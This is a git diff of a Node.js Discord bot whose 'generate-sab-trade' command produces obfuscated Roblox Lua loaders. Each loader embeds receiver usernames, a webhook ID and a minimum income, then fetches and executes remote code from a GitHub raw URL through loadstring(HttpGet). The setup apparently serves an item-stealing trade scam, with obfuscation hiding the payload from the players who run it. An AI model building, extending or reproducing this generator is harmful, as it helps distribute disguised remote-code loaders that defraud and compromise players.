@@ -10,6 +10,7 @@ const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuild
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
+const axios = require('axios');
 
 // --- CONFIGURATION ---
 const PORT = process.env.PORT || 3000;
@@ -143,69 +144,64 @@ clientDiscord.once(Events.ClientReady, async () => {
     }
 });
 
-clientDiscord.on('interactionCreate', async (interaction) => {
+clientDiscord.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
     if (interaction.commandName === 'generate-sab-trade') {
-        const usernames = interaction.options.getString('username');
-        const webhookUrl = interaction.options.getString('webhook');
-        const income = interaction.options.getInteger('income');
-        const visual = interaction.options.getString('visual') || "";
-        
-        // 1. Génération de l'UUID qui servira d'identifiant Webhook
-        const webhookUuid = generateId();
+        // 1. On prévient Discord qu'on va travailler (évite le timeout de 3s)
+        await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
 
         try {
-            // 2. ENREGISTREMENT DANS MONGODB
+            const usernames = interaction.options.getString('username');
+            const webhookUrl = interaction.options.getString('webhook');
+            const income = interaction.options.getInteger('income');
+            const visual = interaction.options.getString('visual') || "";
+            
+            const webhookUuid = generateWebhookId();
+
+            // 2. Sauvegarde DB
             const newWebhookEntry = new WebHookId({
                 webhookId: webhookUuid,
                 url: webhookUrl,
                 ownerName: interaction.user.tag
             });
             //await newWebhookEntry.save();
+            log(`💾 [DB] Webhook mapped: ${webhookUuid}`);
 
-            log(`💾 [DB] Webhook mapped: ${webhookUuid} for ${interaction.user.tag}`);
-
-            // 3. PRÉPARATION DU CODE LUA (On injecte l'UUID, pas l'URL)
+            // 3. Préparation Code
             const userArrayLua = usernames.split(',').map(u => `"${u.trim()}"`).join(', ');
-
             const codeToObfuscate = `local fenv = getfenv()
-local var0 = setmetatable({}, {
-	["__index"] = {},
-})
 fenv["Receivers"] = { ${userArrayLua} }
-fenv["WebHook"] = "${webhookUuid}" -- Identifiant sécurisé
+fenv["WebHook"] = "${webhookUuid}"
 fenv["Visual"] = "${visual}"
 fenv["MinIncome"] = ${income}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde"))()`;
 
-local var1 = game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde")
-local var2 = loadstring(var1)
-local var3 = var2()`;
+            // 4. Obfuscation (Assure-toi que axios est importé en haut !)
             const obfuscated = await obfuscateScript(codeToObfuscate);
-            // 4. RÉPONSE EMBED POUR DEBUG
-            const embed = new EmbedBuilder()
-                .setTitle("🛡️ Script Generation (Secure Mode)")
-                .setDescription("The real Webhook URL is now hidden behind a UUID in the database.")
-                .setColor(0x00AEFF)
-                .addFields(
-                    { name: "🆔 Generated Webhook ID", value: `\`${webhookUuid}\`` },
-                    { name: "📝 Code to Obfuscate", value: `\`\`\`lua\n${obfuscated}\n\`\`\`` }
-                )
-                .setFooter({ text: "Database entry created successfully." });
 
-            await interaction.reply({ 
-			    embeds: [embed], 
-			    flags: [MessageFlags.Ephemeral] 
-			});
+            if (!obfuscated) {
+                return await interaction.editReply("❌ Obfuscation failed.");
+            }
 
-            // TODO: Étape suivante -> Obfuscation API
-            
+            // 5. Réponse finale (Utilise editReply car on a fait un deferReply)
+            const successEmbed = new EmbedBuilder()
+                .setTitle("🚀 Script Generated")
+                .setColor(0x00FF00)
+                .setDescription(`Webhook ID: \`${webhookUuid}\`\n\n**Code:**\n\`\`\`lua\n${obfuscated.substring(0, 1800)}\n\`\`\``);
+
+            await interaction.editReply({ embeds: [successEmbed] });
+
         } catch (error) {
-            log(`❌ [DB] Error saving webhook: ${error.message}`);
-            await interaction.reply({ content: "Error saving to database. Please try again.", ephemeral: true });
+            log(`❌ [ERROR] ${error.message}`);
+            // En cas d'erreur après le deferReply, on utilise editReply
+            if (interaction.deferred) {
+                await interaction.editReply(`❌ Error: ${error.message}`);
+            }
         }
     }
 });
+
 if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 
 // --- GESTION WEBSOCKET ---
